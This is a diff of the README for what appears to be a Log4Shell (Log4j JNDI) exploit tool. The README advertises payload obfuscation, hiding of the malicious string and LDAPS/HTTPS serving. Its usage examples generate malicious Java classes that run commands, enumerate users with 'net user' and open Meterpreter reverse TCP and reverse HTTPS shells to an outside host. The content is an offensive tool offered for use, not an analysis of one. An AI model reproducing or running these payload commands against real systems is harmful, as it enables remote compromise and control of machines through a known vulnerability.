@@ -11,7 +11,7 @@
  * Support multi Java class files
  * Support LDAPS and HTTPS server
  * Support ACME to sign certificate
- * Generate class without java compiler
+ * Generate class without Java compiler
  * Support obfuscate malicious(payload)
  * Hide malicious(payload) string
  * Add secret to protect HTTP server
@@ -33,13 +33,16 @@
    ```
    Execute(no output):
      Log4Shell.exe -gen "execute" -args "-cmd calc" -class "Test"
-     
+
    System(with output):
      Log4Shell.exe -gen "system" -args "-bin cmd -args \"/c net user\"" -class "Test"
-     
-   ReverseTCP(java/meterpreter/reverse_tcp):  // template will be open source after some time
-     Log4Shell.exe -gen "reverse_tcp" -args "-host 127.0.0.1 -port 9979" -class "Test"
-   
+
+   ReverseTCP(java/meterpreter/reverse_tcp):      // template will be open source after some time
+     Log4Shell.exe -gen "reverse_tcp" -args "-lhost 1.1.1.1 -lport 9979" -class "Test"
+
+   ReverseHTTPS(java/meterpreter/reverse_https):  // template will be open source after some time
+     Log4Shell.exe -gen "reverse_https" -args "-lhost 1.1.1.1 -lport 8443 -luri test" -class "Test"  
+
    The generated class file will be saved to the payload directory(can set output flag)
    ```
 
